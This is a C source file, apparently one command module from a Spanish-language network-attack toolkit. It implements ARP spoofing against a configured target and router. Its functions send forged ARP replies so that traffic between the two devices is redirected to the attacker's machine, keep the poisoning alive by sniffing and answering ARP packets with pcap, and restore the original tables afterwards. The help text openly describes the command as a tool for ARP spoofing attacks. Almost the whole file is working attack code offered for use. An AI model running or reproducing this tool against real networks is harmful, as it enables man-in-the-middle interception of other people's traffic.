#include <linux/if_ether.h>
#include <pcap/pcap.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#include "colors.h"
#include "commands.h"
#include "functions.h"
#include "list.h"
#include "logs.h"
#include "pcap_wrapper.h"
#include "properties.h"
#include "properties_types.h"

#define NAME "arp_spoof"

static pcap_t *pcap_handle;

static prop_struct *iface;

static uint32_t local_ip;
static uint8_t local_mac[6];

static uint32_t router_ip;
static uint8_t router_mac[6];

static uint32_t target_ip;
static uint8_t target_mac[6];

int keyboard_interrupt = 0;

static int spoof_help() {
  printf("help -> " AMARILLO "muestra esta ayuda" RESET "\n"
         "send -> " AMARILLO "envia un paquete de susplantación ARP" RESET "\n"
         "handle -> " AMARILLO
         "captura paquetes ARP para mantener la susplantación en pie" RESET "\n"
         "restore -> " AMARILLO
         "restablece las tablas ARP de los dispocitivos afectados" RESET "\n");
  return EXIT_SUCCESS;
}

static int spoof_send() {
  if (!send_arp_reply(local_mac, router_ip, target_mac, target_ip, iface->value)) {
    log_add(NULL, ERROR, "ARPSpoof-Send", "No se pudo enviar el paquete ARP al objetivo");
    log_show_and_clear(NULL);
    return EXIT_FAILURE;
  }
  if (!send_arp_reply(local_mac, target_ip, router_mac, router_ip, iface->value)) {
    log_add(NULL, ERROR, "ARPSpoof-Send", "No se pudo enviar el paquete ARP al router");
    log_show_and_clear(NULL);
    return EXIT_FAILURE;
  }
  return EXIT_SUCCESS;
}

static void packet_handle(u_char *user_d, const struct pcap_pkthdr *header,
                          const u_char *packet) {
  struct arp_header arp = *(const struct arp_header *)(packet + sizeof(struct ethhdr));
  if ((arp.spa == router_ip || arp.spa == target_ip) &&
      (arp.tpa == router_ip || arp.tpa == target_ip) && (arp.spa != arp.tpa)) {
    if (arp.op == 1) {
      if (!send_arp_reply(local_mac, arp.tpa, arp.sha, arp.spa, iface->value)) {
        log_add(NULL, ERROR, "ARPSpoof-Packet-Handle",
                "Error al enviar el paquete ARP Reply");
        log_show_and_clear(NULL);
      }
    } else {
      if (!send_arp_reply(local_mac, arp.spa, arp.tha, arp.tpa, iface->value)) {
        log_add(NULL, ERROR, "ARPSpoof-Packet-Handle",
                "Error al enviar el paquete ARP Reply");
        log_show_and_clear(NULL);
      }
    }
  }
}

void keyboard_handle_interrupt(int sign) {
  pcap_breakloop(pcap_handle);
  keyboard_interrupt = 1;
}

static int spoof_handle() {
  pcap_handle = NULL;
  if (!wrapper_pcap_open_live(&pcap_handle, iface->value, BUFSIZ, 1, 100, NULL)) {
    log_add(NULL, ERROR, "ARPSpoof-Handle", "Error al iniciar pcap");
    log_show_and_clear(NULL);
    return EXIT_FAILURE;
  }

  struct bpf_program fp;
  if (!wrapper_pcap_compile(pcap_handle, &fp, "arp")) {
    log_add(NULL, ERROR, "ARPSpoof-Handle", "no se pudo compilar un filtro con pcap");
    log_show_and_clear(NULL);
    pcap_close(pcap_handle);
    return EXIT_FAILURE;
  }
  if (!wrapper_pcap_setfilter(pcap_handle, &fp)) {
    log_add(NULL, ERROR, "ARPSpoof-Handle", "Error al aplicar el filtro en pcap");
    log_show_and_clear(NULL);
    pcap_close(pcap_handle);
    return EXIT_FAILURE;
  }

  signal(SIGINT, keyboard_handle_interrupt);
  if (!wrapper_pcap_loop(pcap_handle, -1, packet_handle, NULL)) {
    if (keyboard_interrupt) {
      log_clear(NULL);
      log_add(NULL, INFO, "ARPSpoof-Handle", "Se dejo de escuchar paquetes...");
      log_show_and_clear(NULL);
      return EXIT_SUCCESS;
    }
    log_add(NULL, ERROR, "ARPSpoof-Handle", "Error al iniciar escucha en pcap");
    log_show_and_clear(NULL);
    pcap_close(pcap_handle);
    return EXIT_FAILURE;
  }
  signal(SIGINT, SIG_IGN);

  pcap_close(pcap_handle);
  return EXIT_SUCCESS;
}

static int spoof_restore() {
  if (!send_arp_reply(router_mac, router_ip, target_mac, target_ip, iface->value)) {
    log_add(NULL, ERROR, "ARPSpoof-Restore",
            "No se pudo enviar el paquete ARP al objetivo");
    log_show_and_clear(NULL);
    return EXIT_FAILURE;
  }
  if (!send_arp_reply(target_mac, target_ip, router_mac, router_ip, iface->value)) {
    log_add(NULL, ERROR, "ARPSpoof-Restore",
            "No se pudo enviar el paquete ARP al router");
    log_show_and_clear(NULL);
    return EXIT_FAILURE;
  }
  return EXIT_SUCCESS;
}

static int fn_arp_spoof(LIST_ptr args) {
  if (list_size(*args) != 2) {
    fprintf(stderr, "Uso: " NAME " [operación|help]\n");
    return EXIT_FAILURE;
  }

  NODE_ptr option_node = list_index_get(1, *args);
  if (option_node == NULL) {
    DynSetLog(NULL);
    log_add(NULL, ERROR, "ARPSpoof", "No se pudo acceder al argumento");
    log_show_and_clear(NULL);
    return EXIT_FAILURE;
  }

  char *option_value = (char *)option_node->point;
  if (strcmp(option_value, "help") == 0) return spoof_help();

  iface = prop_reg_value("LOCAL_IFACE", *prop_register, 1);
  if (iface == NULL) {
    log_add(NULL, ERROR, "ARPSpoof", "No se pudo obtener la interfaz de red");
    log_show_and_clear(NULL);
    return EXIT_FAILURE;
  };
  if (!get_local_ip(&local_ip, iface->value)) {
    log_add(NULL, ERROR, "ARPSpoof",
            "No se pudo obtener la dirección IP de esta maquina");
    log_show_and_clear(NULL);
    return EXIT_FAILURE;
  }
  if (!get_local_mac(local_mac, iface->value)) {
    log_add(NULL, ERROR, "ARPSpoof",
            "No se pudo obtener la dirección MAC de esta maquina");
    log_show_and_clear(NULL);
    return EXIT_FAILURE;
  }
  prop_struct *router_addr = prop_reg_value("ROUTER_ADDR", *prop_register, 1);
  if (router_addr == NULL) {
    log_add(NULL, ERROR, "ARPSpoof", "No se pudo obtener la dirección IP del router");
    log_show_and_clear(NULL);
    return EXIT_FAILURE;
  }
  prop_struct *router_hwaddr = prop_reg_value("ROUTER_HWADDR", *prop_register, 1);
  if (router_hwaddr == NULL) {
    log_add(NULL, ERROR, "ARPSpoof", "No se pudo obtener la dirección MAC del router");
    log_show_and_clear(NULL);
    return EXIT_FAILURE;
  }
  prop_struct *target_addr = prop_reg_value("TARGET_ADDR", *prop_register, 1);
  if (target_addr == NULL) {
    log_add(NULL, ERROR, "ARPSpoof", "No se pudo obtener la dirección IP objetivo");
    log_show_and_clear(NULL);
    return EXIT_FAILURE;
  }
  prop_struct *target_hwaddr = prop_reg_value("TARGET_HWADDR", *prop_register, 1);
  if (target_hwaddr == NULL) {
    log_add(NULL, ERROR, "ARPSpoof", "No se pudo obtener la dirección MAC objetivo");
    log_show_and_clear(NULL);
    return EXIT_FAILURE;
  }
  to_ip(&router_ip, router_addr->value);
  to_mac(router_mac, router_hwaddr->value);
  to_ip(&target_ip, target_addr->value);
  to_mac(target_mac, target_hwaddr->value);

  if (strcmp(option_value, "send") == 0)
    return spoof_send();
  else if (strcmp(option_value, "handle") == 0)
    return spoof_handle();
  else if (strcmp(option_value, "restore") == 0)
    return spoof_restore();
  fprintf(stderr, "El argumento no es valido, usé el argumento help para mas "
                  "información\n");
  return EXIT_FAILURE;
}

const Command cmd_arp_spoof = {
    NAME,
    "Permite hacer ataques de ARP Spoofing",
    "Ataques de Suplantación ARP",
    "Comando: spoof\n"
    "Descripción: Realiza ataques de suplantación ARP (ARP Spoofing) contra un objetivo "
    "y un router definidos "
    "previamente.\n"
    "\n"
    "Uso:\n"
    "  arp_spoof help -> Muestra esta ayuda.\n"
    "  arp_spoof send -> Envía un solo paquete ARP de suplantación al objetivo y al "
    "router.\n"
    "  arp_spoof handle -> Inicia una escucha de paquetes ARP y mantiene la suplantación "
    "activa respondiendo "
    "automáticamente.\n"
    "  arp_spoof restore -> Restablece las tablas ARP del router y del objetivo a su "
    "estado "
    "original.\n"
    "\n"
    "Descripción detallada de argumentos:\n"
    "  help ->\n"
    "    Muestra esta ayuda explicando cada argumento disponible.\n"
    "\n"
    "  send ->\n"
    "    Envía paquetes ARP Reply falsificados:\n"
    "      - Al objetivo: indicando que la MAC local es la del router.\n"
    "      - Al router: indicando que la MAC local es la del objetivo.\n"
    "    Esto engaña a ambos dispositivos para redirigir el tráfico a la máquina "
    "atacante.\n"
    "\n"
    "  handle ->\n"
    "    Inicia un sniffer ARP con PCAP:\n"
    "      - Usa un filtro para capturar solo paquetes ARP.\n"
    "      - Responde automáticamente con paquetes falsificados si detecta paquetes "
    "legítimos entre el objetivo y el "
    "router.\n"
    "      - Se puede detener con CTRL+C (SIGINT), restableciendo el estado.\n"
    "\n"
    "  restore ->\n"
    "    Envía paquetes ARP legítimos para restaurar las tablas ARP:\n"
    "      - Al objetivo: se le informa la MAC real del router.\n"
    "      - Al router: se le informa la MAC real del objetivo.\n"
    "    Esto detiene la suplantación y restablece la comunicación normal entre los "
    "dispositivos.\n"
    "\n"
    "Notas:\n"
    "  - Requiere las siguientes propiedades registradas:\n"
    "      LOCAL_IFACE -> Nombre de la interfaz de red local\n"
    "      ROUTER_ADDR -> Dirección IP del router\n"
    "      ROUTER_HWADDR -> Dirección MAC del router\n"
    "      TARGET_ADDR -> Dirección IP del objetivo\n"
    "      TARGET_HWADDR -> Dirección MAC del objetivo\n"
    "  - La interfaz debe tener permisos para enviar paquetes sin restricciones (modo "
    "promiscuo).\n",
    {1, 1},
    fn_arp_spoof,
};
